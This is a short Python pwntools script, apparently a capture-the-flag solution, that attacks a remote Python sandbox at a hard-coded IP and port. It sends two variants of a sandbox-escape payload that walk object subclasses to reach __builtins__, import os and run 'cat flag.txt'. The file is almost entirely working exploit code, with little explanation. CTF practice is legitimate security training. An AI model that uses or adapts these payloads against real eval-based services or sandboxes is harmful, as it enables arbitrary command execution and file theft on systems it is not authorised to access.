#!/usr/bin/env python3
from pwn import *

host = '212.2.250.33'
port = 30968

io = remote(host, port)
io.recvuntil(b'>', timeout=2)

# Use ultra-compact syntax
# s = subclasses, g = globals, b = builtins, i = __import__
payload = b"(s:=().__class__.__bases__[0].__subclasses__())[137].__init__.__globals__['__builtins__']['__import__']('os').popen('cat flag.txt').read()"

print("[*] Ultra compact with walrus...")
io.sendline(payload)
time.sleep(1)
response = io.recvall(timeout=2).decode()
print(response)

if 'Kaal{' not in response:
    io = remote(host, port, level='error')
    io.recvuntil(b'>', timeout=2)
    
    # Even shorter - use index directly
    payload = b"().__class__.__base__.__subclasses__()[137].__init__.__globals__['__builtins__']['__import__']('os').popen('cat flag.txt').read()"
    print("\n[*] Using __base__ instead of __bases__[0]...")
    io.sendline(payload)
    time.sleep(1)
    response = io.recvall(timeout=2).decode()
    print(response)

io.close()
